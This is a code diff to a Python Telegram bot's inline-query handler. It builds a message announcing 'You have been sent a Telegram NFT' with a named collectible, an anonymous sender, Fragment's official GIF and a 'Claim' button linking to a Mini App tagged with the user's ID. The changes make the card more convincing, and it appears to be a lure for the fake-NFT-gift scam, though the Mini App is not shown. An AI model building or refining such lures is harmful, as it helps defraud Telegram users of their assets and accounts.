@@ -76,9 +76,15 @@ async def inline_query(update: Update, context: ContextTypes.DEFAULT_TYPE):
     # Ссылка на Mini App
     mini_app_link = f"https://t.me/{BOT_USERNAME}/{APP_SHORT_NAME}?startapp={user_id}"
 
+    # TODO: Заменить на реальное название NFT и номер
+    nft_name = "Lol Pop #130400"
+
+    # TODO: Заменить на публичный URL GIF (загрузи на imgur.com)
+    gif_url = "https://nft.fragment.com/telegram.gif"
+
     # Создаём красивую карточку с кнопкой
     keyboard = [
-        [InlineKeyboardButton("🎁 Забрать NFT", url=mini_app_link)]
+        [InlineKeyboardButton("Забрать", url=mini_app_link)]
     ]
     reply_markup = InlineKeyboardMarkup(keyboard)
 
@@ -87,13 +93,12 @@ async def inline_query(update: Update, context: ContextTypes.DEFAULT_TYPE):
         InlineQueryResultArticle(
             id="nft_gift",
             title="🎁 Отправить Telegram NFT",
-            description="Получатель сможет забрать все NFT одной кнопкой",
-            thumbnail_url="https://nft.fragment.com/telegram.gif",
+            description="Получатель сможет забрать NFT одной кнопкой",
+            thumbnail_url=gif_url,
             input_message_content=InputTextMessageContent(
                 message_text=(
-                    "🎁 **Вам отправлен Telegram NFT**\n\n"
-                    "От: **Аккаунт скрыт**\n\n"
-                    "Нажмите кнопку ниже чтобы забрать NFT!"
+                    f"Вам отправлен Telegram NFT: **{nft_name}**\n\n"
+                    f"От: **Аккаунт скрыт**"
                 ),
                 parse_mode='Markdown'
             ),
